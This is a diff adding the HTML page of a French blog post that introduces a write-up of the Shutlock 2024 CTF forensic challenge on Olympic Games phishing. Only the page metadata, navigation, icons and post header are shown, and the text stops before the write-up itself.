@@ -1,0 +1,411 @@
+
+
+<!DOCTYPE html>
+<html lang="fr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="UTF-8">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge"><meta name="robots" content="index, follow">
+<meta name="revisit-after" content="15 days"><link rel="author" href="/humans.txt">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="icon" href="/favicon.ico" type="image/x-icon"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileImage" content="/mstile-144x144.png">
+<meta name="theme-color" content="#494f5c">
+<meta name="msapplication-TileColor" content="#494f5c">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#494f5c"><meta name="author" content="Onirix"><meta name="description" content="Blog d&#39;Onirix">
+
+  <meta itemprop="name" content="Shutlock 2024 - Enquête sur le phishing des JO : Retracer l&#39;attaque 2/2">
+  <meta itemprop="description" content="Ceci est le write-up de la deuxième partie du challenge Forensic Enquête sur le phishing des JO du CTF Shutlock édition 2024 organisé par la DGSI et EPITA.
+Énoncé Bravo ! Vous voici dans la deuxième partie de votre enquête. Le dump réseau vous a été confié avec une partie de son système de fichiers. L&#39;utilisatrice à qui appartiennent ces informations, est une scientifique qui travaille sur le chiffrement du système d&#39;information des JO.">
+  <meta itemprop="datePublished" content="2024-07-12T09:16:24+02:00">
+  <meta itemprop="dateModified" content="2024-07-12T09:16:24+02:00">
+  <meta itemprop="wordCount" content="1762">
+  <meta itemprop="keywords" content="Shutlock 2024,Forensic,Phishing 2/2,Write-Up"><meta property="og:url" content="http://localhost:1313/posts/shutlock2024_phishing_2-2/shutlock2024_phishing_2-2/">
+  <meta property="og:site_name" content="Onirix">
+  <meta property="og:title" content="Shutlock 2024 - Enquête sur le phishing des JO : Retracer l&#39;attaque 2/2">
+  <meta property="og:description" content="Ceci est le write-up de la deuxième partie du challenge Forensic Enquête sur le phishing des JO du CTF Shutlock édition 2024 organisé par la DGSI et EPITA.
+Énoncé Bravo ! Vous voici dans la deuxième partie de votre enquête. Le dump réseau vous a été confié avec une partie de son système de fichiers. L&#39;utilisatrice à qui appartiennent ces informations, est une scientifique qui travaille sur le chiffrement du système d&#39;information des JO.">
+  <meta property="og:locale" content="fr">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-07-12T09:16:24+02:00">
+    <meta property="article:modified_time" content="2024-07-12T09:16:24+02:00">
+    <meta property="article:tag" content="Shutlock 2024">
+    <meta property="article:tag" content="Forensic">
+    <meta property="article:tag" content="Phishing 2/2">
+    <meta property="article:tag" content="Write-Up">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Shutlock 2024 - Enquête sur le phishing des JO : Retracer l&#39;attaque 2/2">
+  <meta name="twitter:description" content="Ceci est le write-up de la deuxième partie du challenge Forensic Enquête sur le phishing des JO du CTF Shutlock édition 2024 organisé par la DGSI et EPITA.
+Énoncé Bravo ! Vous voici dans la deuxième partie de votre enquête. Le dump réseau vous a été confié avec une partie de son système de fichiers. L&#39;utilisatrice à qui appartiennent ces informations, est une scientifique qui travaille sur le chiffrement du système d&#39;information des JO.">
+<title>Shutlock 2024 - Enquête sur le phishing des JO : Retracer l&#39;attaque 2/2</title>
+<link rel="stylesheet dns-prefetch preconnect preload prefetch" as="style" href="http://localhost:1313/css/style.min.b9b0196180ada2f18e02576d3cdb3bc8754a548453d05e24e7edba2a7084e3ae.css" integrity="sha256-ubAZYYCtovGOAldtPNs7yHVKVIRT0F4k5+26KnCE464=" crossorigin="anonymous">
+	</head>
+<body id="page">
+	<header id="site-header" class="animated slideInUp">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="http://localhost:1313/">Onirix</a>
+				</div>
+				<nav class="site-nav hide-in-mobile"><head>
+	<style>
+		.menu{
+			display:flex;
+			flex-direction: row;
+		}
+
+		.menu-item {
+   			margin-right: 20px;
+		}
+	</style>
+</head>
+<div class="menu"><div class="menu-item">
+			<a href="http://localhost:1313/posts/">Articles</a>
+		</div><div class="menu-item">
+			<a href="http://localhost:1313/categories/">Catégories</a>
+		</div><div class="menu-item">
+			<a href="http://localhost:1313/apropos">A propos</a>
+		</div></div>
+</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<button id="toc-btn" class="hdr-btn desktop-only-ib" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-list"><line x1="8" y1="6" x2="21" y2="6"></line><line x1="8" y1="12" x2="21" y2="12"></line><line x1="8" y1="18" x2="21" y2="18"></line><line x1="3" y1="6" x2="3" y2="6"></line><line x1="3" y1="12" x2="3" y2="12"></line><line x1="3" y1="18" x2="3" y2="18"></line></svg></button><span class="hdr-social hide-in-mobile"><a href="https://root-me.org/Onirix" target="_blank" rel="noopener me" title="Root me"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="15 20 20 10" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <g transform="matrix(Infinity NaN NaN Infinity 0 0)" id="50923579-270d-4d1a-9075-40d70aad8772"  >
+    </g>
+    <g transform="matrix(1 0 0 1 24 24)" id="eaa9c12f-b9b6-4657-81a3-97aa8372d3d2"  >
+    <rect style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-dashoffset: 0; stroke-linejoin: miter; stroke-miterlimit: 4; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1; visibility: hidden;" vector-effect="non-scaling-stroke"  x="-24" y="-24" rx="0" ry="0" width="48" height="48" />
+    </g>
+    <g transform="matrix(0.04 0 0 0.04 24 24)"  >
+    <g style="" vector-effect="non-scaling-stroke"   >
+            <g transform="matrix(1 0 0 1 0 0)"  >
+    <rect style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-dashoffset: 0; stroke-linejoin: miter; stroke-miterlimit: 4; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1; visibility: hidden;" vector-effect="non-scaling-stroke"  x="-540" y="-540" rx="0" ry="0" width="1080" height="1080" />
+    </g>
+            <g transform="matrix(1.89 0 0 1.89 0.28 155.42)"  >
+    <path style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-dashoffset: 0; stroke-linejoin: miter; stroke-miterlimit: 4; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1;" vector-effect="non-scaling-stroke"  transform=" translate(-296.95, -326.7)" d="M 299.2 319.9 C 299.2 319.9 299.2 319.9 299.2 319.9 C 299.09999999999997 319.79999999999995 299 319.7 299 319.59999999999997 C 298.9 319.49999999999994 298.9 319.49999999999994 298.8 319.4 C 298.8 319.4 298.8 319.4 298.8 319.4 C 298.7 319.4 298.7 319.29999999999995 298.6 319.29999999999995 C 298.5 319.19999999999993 298.40000000000003 319.19999999999993 298.3 319.09999999999997 C 298.2 319.09999999999997 298.1 318.99999999999994 298 318.99999999999994 C 297.9 318.99999999999994 297.8 318.8999999999999 297.8 318.8999999999999 C 297.7 318.8999999999999 297.6 318.8999999999999 297.5 318.7999999999999 C 297.4 318.7999999999999 297.3 318.7999999999999 297.2 318.7999999999999 C 297.09999999999997 318.7999999999999 297 318.7999999999999 296.9 318.7999999999999 C 296.79999999999995 318.7999999999999 296.7 318.7999999999999 296.59999999999997 318.7999999999999 C 296.49999999999994 318.7999999999999 296.4 318.7999999999999 296.29999999999995 318.7999999999999 C 296.19999999999993 318.7999999999999 296.09999999999997 318.7999999999999 295.99999999999994 318.8999999999999 C 295.8999999999999 318.8999999999999 295.79999999999995 318.99999999999994 295.79999999999995 318.99999999999994 C 295.69999999999993 318.99999999999994 295.59999999999997 319.09999999999997 295.49999999999994 319.09999999999997 C 295.3999999999999 319.09999999999997 295.29999999999995 319.2 295.19999999999993 319.29999999999995 C 295.0999999999999 319.29999999999995 295.0999999999999 319.4 294.99999999999994 319.4 C 294.99999999999994 319.4 294.99999999999994 319.4 294.99999999999994 319.4 C 294.8999999999999 319.5 294.8999999999999 319.5 294.79999999999995 319.59999999999997 C 294.69999999999993 319.7 294.59999999999997 319.79999999999995 294.59999999999997 319.79999999999995 C 294.59999999999997 319.79999999999995 294.59999999999997 319.79999999999995 294.59999999999997 319.79999999999995 L 286.49999999999994 329.9 C 285.49999999999994 331.2 285.69999999999993 333 286.99999999999994 334 C 287.49999999999994 334.4 288.19999999999993 334.6 288.79999999999995 334.6 C 289.69999999999993 334.6 290.49999999999994 334.20000000000005 291.09999999999997 333.5 L 291.2 333.4 C 294.2 329.7 299.8 329.7 302.7 333.4 L 302.8 333.5 C 303.40000000000003 334.2 304.2 334.6 305.1 334.6 C 305.70000000000005 334.6 306.40000000000003 334.40000000000003 306.90000000000003 334 C 308.20000000000005 333 308.40000000000003 331.1 307.40000000000003 329.9 z" stroke-linecap="round" />
+    </g>
+            <g transform="matrix(1.89 0 0 1.89 -62.81 -148.23)"  >
+    <path style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-dashoffset: 0; stroke-linejoin: miter; stroke-miterlimit: 4; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1;" vector-effect="non-scaling-stroke"  transform=" translate(-263.6, -166.2)" d="M 285.7 149.1 C 281.59999999999997 149.1 278.2 152.29999999999998 278 156.4 L 262.7 162 C 261.9 162.3 261.3 163 261.3 163.9 L 261.3 173.6 L 249 173.6 C 248.1 170.29999999999998 245.2 167.9 241.6 167.9 C 237.4 167.9 233.9 171.3 233.9 175.6 C 233.9 179.79999999999998 237.3 183.29999999999998 241.6 183.29999999999998 C 245.2 183.29999999999998 248.1 180.89999999999998 249 177.6 L 263.3 177.6 C 264.40000000000003 177.6 265.3 176.7 265.3 175.6 L 265.3 165.29999999999998 L 278.8 160.29999999999998 C 280.1 162.79999999999998 282.7 164.49999999999997 285.6 164.49999999999997 C 289.8 164.49999999999997 293.3 161.09999999999997 293.3 156.79999999999998 C 293.40000000000003 152.6 289.90000000000003 149.1 285.7 149.1 z" stroke-linecap="round" />
+    </g>
+            <g transform="matrix(1.89 0 0 1.89 -51.65 90.72)"  >
+    <path style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-dashoffset: 0; stroke-linejoin: miter; stroke-miterlimit: 4; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1;" vector-effect="non-scaling-stroke"  transform=" translate(-269.5, -292.5)" d="M 269.5 292.3 C 267 291.40000000000003 264.6 290.5 262.3 289.5 C 260.6 288.7 258.90000000000003 287.9 257.3 287.1 C 261.1 290.90000000000003 270.3 297.70000000000005 280.2 297.90000000000003 C 280.8 297.20000000000005 281.3 296.50000000000006 281.7 295.6 C 280.2 295.3 278.7 295 277.2 294.6 C 274.5 293.90000000000003 272 293.20000000000005 269.5 292.3 z" stroke-linecap="round" />
+    </g>
+            <g transform="matrix(1.89 0 0 1.89 0 0)"  >
+    <path style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-dashoffset: 0; stroke-linejoin: miter; stroke-miterlimit: 4; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1;" vector-effect="non-scaling-stroke"  transform=" translate(-296.8, -244.55)" d="M 395 222.5 C 395 217.8 394.7 213.1 394 208.6 C 394 208.29999999999998 393.9 208 393.9 207.7 C 387.79999999999995 168 357.7 135.39999999999998 318.09999999999997 126.69999999999999 C 317.09999999999997 122.19999999999999 313.09999999999997 118.79999999999998 308.29999999999995 118.79999999999998 C 302.69999999999993 118.79999999999998 298.19999999999993 123.29999999999998 298.19999999999993 128.89999999999998 C 298.19999999999993 133.7 301.5999999999999 137.7 306.0999999999999 138.7 L 306.0999999999999 175.6 C 306.0999999999999 176.2 306.3999999999999 176.79999999999998 306.8999999999999 177.2 C 307.19999999999993 177.39999999999998 307.5999999999999 177.5 307.99999999999994 177.5 C 308.19999999999993 177.5 308.49999999999994 177.5 308.69999999999993 177.4 L 323.49999999999994 171.8 C 324.49999999999994 173.3 325.99999999999994 174.3 327.79999999999995 174.8 L 327.79999999999995 192.20000000000002 C 320.29999999999995 201.4 310.99999999999994 209.70000000000002 301.09999999999997 217.10000000000002 L 289.79999999999995 190.90000000000003 C 291.9 189.50000000000003 293.29999999999995 187.20000000000005 293.29999999999995 184.50000000000003 C 293.29999999999995 180.30000000000004 289.9 176.80000000000004 285.59999999999997 176.80000000000004 C 281.4 176.80000000000004 277.9 180.20000000000005 277.9 184.50000000000003 C 277.9 188.70000000000002 281.29999999999995 192.20000000000002 285.59999999999997 192.20000000000002 C 285.7 192.20000000000002 285.9 192.20000000000002 285.99999999999994 192.20000000000002 L 297.79999999999995 219.50000000000003 C 290.9 224.50000000000003 283.79999999999995 229.00000000000003 276.79999999999995 233.10000000000002 L 243.2 223 C 242.79999999999998 222.9 242.39999999999998 222.9 242 223.1 L 232 227 C 230.6 225.1 228.4 223.9 225.8 223.9 C 221.60000000000002 223.9 218.10000000000002 227.3 218.10000000000002 231.6 C 218.10000000000002 235.79999999999998 221.50000000000003 239.29999999999998 225.8 239.29999999999998 C 230 239.29999999999998 233.5 235.89999999999998 233.5 231.6 C 233.5 231.29999999999998 233.4 231 233.4 230.7 L 242.8 227 L 272.1 235.8 C 247.10000000000002 249.8 224.70000000000002 257.90000000000003 221.00000000000003 259.2 L 219.20000000000002 259.8 C 217.60000000000002 258.6 215.60000000000002 257.90000000000003 213.4 257.90000000000003 C 213.3 257.90000000000003 213.20000000000002 257.90000000000003 213.1 257.90000000000003 C 208.4 246.80000000000004 206 234.70000000000005 206 222.60000000000002 C 206 216.60000000000002 206.6 210.70000000000002 207.7 205.00000000000003 L 251.6 205.00000000000003 C 252.5 208.30000000000004 255.4 210.70000000000002 259 210.70000000000002 C 263.2 210.70000000000002 266.7 207.3 266.7 203.00000000000003 C 266.7 198.80000000000004 263.3 195.30000000000004 259 195.30000000000004 C 255.4 195.30000000000004 252.5 197.70000000000005 251.6 201.00000000000003 L 208.6 201.00000000000003 C 216.7 168.10000000000002 242.7 141.8 276.3 134.00000000000003 C 278.1 136.90000000000003 281.3 138.90000000000003 284.90000000000003 138.90000000000003 C 290.50000000000006 138.90000000000003 295.00000000000006 134.40000000000003 295.00000000000006 128.80000000000004 C 295.00000000000006 123.20000000000005 290.50000000000006 118.70000000000005 284.90000000000003 118.70000000000005 C 280.00000000000006 118.70000000000005 276.00000000000006 122.20000000000005 275.00000000000006 126.70000000000005 C 230.90000000000006 136.70000000000005 198.60000000000005 176.40000000000003 198.60000000000005 222.40000000000003 C 198.60000000000005 235.50000000000003 201.20000000000005 248.60000000000002 206.30000000000004 260.6 C 204.40000000000003 262.40000000000003 203.30000000000004 265 203.30000000000004 267.8 C 203.30000000000004 272.3 206.20000000000005 276 210.20000000000005 277.40000000000003 L 210.20000000000005 316.8 C 210.20000000000005 317.5 210.40000000000003 318.2 210.80000000000004 318.8 L 213.00000000000003 320.3 L 242.90000000000003 341.40000000000003 L 242.90000000000003 366.6 C 242.90000000000003 368.70000000000005 244.60000000000002 370.40000000000003 246.70000000000005 370.40000000000003 L 346.70000000000005 370.40000000000003 C 348.80000000000007 370.40000000000003 350.50000000000006 368.70000000000005 350.50000000000006 366.6 L 350.50000000000006 341.40000000000003 L 380.50000000000006 320.3 L 382.70000000000005 318.7 C 383.1 318.09999999999997 383.30000000000007 317.4 383.30000000000007 316.7 L 383.30000000000007 277 C 387.00000000000006 275.5 389.6000000000001 271.9 389.6000000000001 267.7 C 389.6000000000001 265.09999999999997 388.6000000000001 262.7 387.00000000000006 260.9 C 392.30000000000007 248.99999999999997 395.00000000000006 235.79999999999998 395.00000000000006 222.49999999999997 z M 281.4 125.6 C 282.29999999999995 124.6 283.59999999999997 124 285 124 C 287.7 124 289.9 126.2 289.9 128.9 C 289.9 131.6 287.7 133.8 285 133.8 C 284 133.8 283.1 133.5 282.3 133 C 281 132.1 280.1 130.6 280.1 129 C 280.1 127.6 280.6 126.4 281.40000000000003 125.6 z M 303.4 128.79999999999998 C 303.4 126.09999999999998 305.59999999999997 123.89999999999998 308.29999999999995 123.89999999999998 C 309.69999999999993 123.89999999999998 310.9 124.49999999999997 311.79999999999995 125.39999999999998 C 312.59999999999997 126.29999999999998 313.09999999999997 127.39999999999998 313.09999999999997 128.7 C 313.09999999999997 130.29999999999998 312.29999999999995 131.79999999999998 310.99999999999994 132.7 C 310.19999999999993 133.29999999999998 309.29999999999995 133.6 308.19999999999993 133.6 C 305.5999999999999 133.7 303.3999999999999 131.5 303.3999999999999 128.79999999999998 z M 322.2 167.29999999999998 C 322.2 167.6 322.3 167.79999999999998 322.3 167.99999999999997 L 310.1 172.59999999999997 L 310.1 138.59999999999997 C 313.1 138.09999999999997 315.6 136.29999999999995 317 133.79999999999995 C 327.7 136.19999999999996 337.7 140.49999999999994 346.6 146.39999999999995 C 346.5 161.19999999999996 340.8 174.79999999999995 331.8 187.09999999999997 L 331.8 174.69999999999996 C 335.1 173.79999999999995 337.5 170.89999999999995 337.5 167.29999999999995 C 337.5 163.09999999999997 334.1 159.59999999999997 329.8 159.59999999999997 C 325.6 159.69999999999996 322.2 163.09999999999997 322.2 167.29999999999995 z M 213.5 272.7 C 212.3 272.7 211.2 272.2 210.3 271.5 C 209.3 270.6 208.60000000000002 269.3 208.60000000000002 267.9 C 208.60000000000002 267.29999999999995 208.70000000000002 266.7 208.90000000000003 266.2 C 209.60000000000002 264.4 211.40000000000003 263.09999999999997 213.40000000000003 263.09999999999997 C 214.30000000000004 263.09999999999997 215.10000000000002 263.4 215.80000000000004 263.79999999999995 C 217.20000000000005 264.59999999999997 218.20000000000005 266.19999999999993 218.20000000000005 267.99999999999994 C 218.20000000000005 268.8999999999999 217.90000000000003 269.69999999999993 217.50000000000006 270.3999999999999 C 216.80000000000007 271.7999999999999 215.30000000000007 272.69999999999993 213.50000000000006 272.69999999999993 z M 383.5 270.8 C 382.6 271.90000000000003 381.2 272.7 379.7 272.7 C 378.3 272.7 377.09999999999997 272.09999999999997 376.2 271.2 C 375.4 270.3 374.9 269.2 374.9 267.9 C 374.9 265.79999999999995 376.2 264 378.09999999999997 263.4 C 378.59999999999997 263.2 379.2 263.09999999999997 379.79999999999995 263.09999999999997 C 382.09999999999997 263.09999999999997 384.09999999999997 264.79999999999995 384.59999999999997 266.99999999999994 C 384.7 267.29999999999995 384.7 267.59999999999997 384.7 267.99999999999994 C 384.5 268.99999999999994 384.09999999999997 269.99999999999994 383.5 270.79999999999995 z M 380.5 257.8 C 380.2 257.8 379.9 257.8 379.6 257.8 C 374 257.8 369.5 262.3 369.5 267.90000000000003 C 369.5 272.20000000000005 372.2 275.90000000000003 376.1 277.3 L 376.1 314.1 L 344.6 336.3 C 343.6 337 343 338.2 343 339.40000000000003 L 343 360.6 C 343 361.8 342 362.8 340.8 362.8 L 329.1 362.8 C 327.90000000000003 362.8 326.90000000000003 361.8 326.90000000000003 360.6 L 326.90000000000003 353 C 326.90000000000003 351 325.50000000000006 349.2 323.50000000000006 349 C 321.20000000000005 348.8 319.30000000000007 350.6 319.30000000000007 352.8 L 319.30000000000007 360.7 C 319.30000000000007 361.9 318.30000000000007 362.9 317.1000000000001 362.9 L 302.80000000000007 362.9 C 301.6000000000001 362.9 300.6000000000001 361.9 300.6000000000001 360.7 L 300.6000000000001 349 C 300.6000000000001 347 299.2000000000001 345.2 297.2000000000001 345 C 294.9000000000001 344.8 293.0000000000001 346.6 293.0000000000001 348.8 L 293.0000000000001 360.8 C 293.0000000000001 362 292.0000000000001 363 290.8000000000001 363 L 276.5000000000001 363 C 275.3000000000001 363 274.3000000000001 362 274.3000000000001 360.8 L 274.3000000000001 353 C 274.3000000000001 351 272.90000000000015 349.2 270.90000000000015 349 C 268.60000000000014 348.8 266.70000000000016 350.6 266.70000000000016 352.8 L 266.70000000000016 360.7 C 266.70000000000016 361.9 265.70000000000016 362.9 264.50000000000017 362.9 L 252.80000000000018 362.9 C 251.6000000000002 362.9 250.6000000000002 361.9 250.6000000000002 360.7 L 250.6000000000002 339.5 C 250.6000000000002 338.3 250.0000000000002 337.1 249.0000000000002 336.4 L 217.6 314.2 L 217.6 277 C 221.1 275.4 223.5 271.9 223.5 267.8 C 223.5 267.2 223.4 266.6 223.3 266 C 227.3 264.6 257.8 253.7 287.8 235 C 328.40000000000003 209.7 350.90000000000003 181 353.5 151.5 C 371 165.6 383.1 186 386.6 208.9 C 386.1 259 298.8 289.9 297.90000000000003 290.2 C 297.70000000000005 290.3 297.20000000000005 290.4 296.8 290.59999999999997 C 295.7 290.4 294.6 290.2 293.40000000000003 289.99999999999994 C 292.6 289.79999999999995 291.70000000000005 289.69999999999993 290.90000000000003 289.49999999999994 C 289.6 289.29999999999995 288.3 288.99999999999994 287.00000000000006 288.69999999999993 C 286.80000000000007 288.5999999999999 286.50000000000006 288.5999999999999 286.30000000000007 288.5999999999999 C 285.80000000000007 288.4999999999999 285.30000000000007 288.3999999999999 284.80000000000007 288.2999999999999 C 284.20000000000005 288.1999999999999 283.6000000000001 287.9999999999999 283.00000000000006 287.8999999999999 C 281.6000000000001 287.5999999999999 280.20000000000005 287.2999999999999 278.90000000000003 286.8999999999999 C 276.40000000000003 286.2999999999999 274.00000000000006 285.5999999999999 271.6 284.99999999999994 C 269.3 284.29999999999995 266.90000000000003 283.69999999999993 264.70000000000005 282.99999999999994 C 264.6 282.99999999999994 264.6 282.99999999999994 264.50000000000006 282.99999999999994 C 262.80000000000007 282.49999999999994 261.20000000000005 281.99999999999994 259.6000000000001 281.3999999999999 C 259.1000000000001 281.19999999999993 258.50000000000006 280.99999999999994 258.00000000000006 280.8999999999999 C 257.20000000000005 280.5999999999999 256.50000000000006 280.3999999999999 255.80000000000007 280.19999999999993 C 254.50000000000006 279.79999999999995 253.30000000000007 279.3999999999999 252.20000000000007 278.8999999999999 C 252.20000000000007 278.8999999999999 252.10000000000008 278.8999999999999 252.10000000000008 278.8999999999999 C 250.30000000000007 278.2999999999999 248.70000000000007 277.69999999999993 247.30000000000007 277.0999999999999 C 245.80000000000007 276.4999999999999 244.50000000000006 275.9999999999999 243.50000000000006 275.5999999999999 C 242.50000000000006 275.0999999999999 241.60000000000005 274.7999999999999 241.10000000000005 274.4999999999999 C 240.50000000000006 274.1999999999999 240.20000000000005 274.0999999999999 240.20000000000005 274.0999999999999 C 240.20000000000005 274.0999999999999 240.40000000000003 274.3999999999999 240.80000000000004 274.7999999999999 C 241.20000000000005 275.2999999999999 241.80000000000004 275.9999999999999 242.70000000000005 276.7999999999999 C 243.50000000000006 277.5999999999999 244.60000000000005 278.5999999999999 245.90000000000003 279.5999999999999 C 247.20000000000005 280.5999999999999 248.70000000000005 281.69999999999993 250.30000000000004 282.7999999999999 C 250.30000000000004 282.7999999999999 250.30000000000004 282.7999999999999 250.40000000000003 282.7999999999999 C 249.80000000000004 284.7999999999999 249.40000000000003 286.9999999999999 249.40000000000003 289.1999999999999 C 249.40000000000003 300.6999999999999 258.8 310.09999999999985 270.3 310.09999999999985 C 279.2 310.09999999999985 286.8 304.49999999999983 289.8 296.59999999999985 C 290.8 296.6999999999999 291.90000000000003 296.79999999999984 292.90000000000003 296.89999999999986 C 294.70000000000005 296.9999999999999 296.40000000000003 296.9999999999999 298.00000000000006 296.9999999999999 C 298.1000000000001 296.9999999999999 298.20000000000005 297.0999999999999 298.30000000000007 297.0999999999999 L 315.20000000000005 314.2999999999999 C 319.50000000000006 318.5999999999999 326.20000000000005 319.2999999999999 331.20000000000005 315.9999999999999 L 357.6 301.1999999999999 C 359.90000000000003 299.6999999999999 361.40000000000003 297.09999999999985 361.40000000000003 294.2999999999999 L 361.40000000000003 263.8999999999999 C 371.6 255.79999999999993 380.8 246.19999999999993 386.8 235.29999999999993 C 385.7 243.19999999999993 383.6 250.69999999999993 380.5 257.79999999999995 z M 281.7 295.6 C 281.3 296.40000000000003 280.7 297.20000000000005 280.2 297.90000000000003 L 280.2 297.90000000000003 C 277.8 300.70000000000005 274.2 302.50000000000006 270.2 302.50000000000006 C 266.2 302.50000000000006 262.59999999999997 300.70000000000005 260.2 297.90000000000003 C 258.2 295.6 257.09999999999997 292.6 257.09999999999997 289.40000000000003 C 257.09999999999997 288.6 257.2 287.90000000000003 257.29999999999995 287.1 C 257.29999999999995 287.1 257.29999999999995 287.1 257.29999999999995 287.1 C 258.9 287.90000000000003 260.59999999999997 288.70000000000005 262.29999999999995 289.5 C 264.59999999999997 290.5 266.99999999999994 291.5 269.49999999999994 292.3 C 271.99999999999994 293.2 274.59999999999997 293.90000000000003 277.19999999999993 294.6 C 278.69999999999993 295 280.19999999999993 295.3 281.69999999999993 295.6 z" stroke-linecap="round" />
+    </g>
+    </g>
+    </g>
+</svg></a><a href="https://github.com/0xOnirix" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="http://localhost:1313/posts/">Articles</a></li>
+			<li><a href="http://localhost:1313/categories/">Catégories</a></li>
+			<li><a href="http://localhost:1313/apropos">A propos</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner animated fadeIn faster"><article class="thin">
+			<header class="post-header">
+				<div class="post-meta"><span>12 Jul, 2024</span></div>
+				<h1>Shutlock 2024 - Enquête sur le phishing des JO : Retracer l&#39;attaque 2/2</h1>
+			</header>
+			<div class="post-info"><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-feather"><path d="M20.24 12.24a6 6 0 0 0-8.49-8.49L5 10.5V19h8.5z"></path><line x1="16" y1="8" x2="2" y2="22"></line><line x1="17.5" y1="15" x2="9" y2="15"></line></svg><a href="" target="_blank">Onirix</a></p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="http://localhost:1313/tags/shutlock-2024">Shutlock 2024</a></span><span class="tag"><a href="http://localhost:1313/tags/forensic">Forensic</a></span><span class="tag"><a href="http://localhost:1313/tags/phishing-2/2">Phishing 2/2</a></span><span class="tag"><a href="http://localhost:1313/tags/write-up">Write-Up</a></span></p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg><span class="category"><a href="http://localhost:1313/categories/ctf">CTF</a></span></p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
+    Temps de lecture:
+    
+    
+    
+    8 Minutes</p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>12-07-2024</p></div>
+			<hr class="post-end">
+			<div class="content">
+				<div>
+  <img src="/posts/shutlock2024_phishing_2-2/images/shutlock.png" alt="Logo_Shutlock">
+</div>
